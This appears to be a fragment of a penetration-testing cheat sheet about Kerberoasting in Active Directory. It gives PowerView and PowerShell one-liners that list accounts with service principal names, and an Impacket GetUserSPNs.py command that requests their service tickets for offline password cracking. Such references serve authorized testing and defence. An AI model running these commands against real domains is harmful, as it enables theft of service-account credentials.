#### PowerView
```powershell
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```

#### Impacket - Kerberoasting
```bash
python3 GetUserSPNs.py -request example.com/user:password
```

#### PowerShell
```powershell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

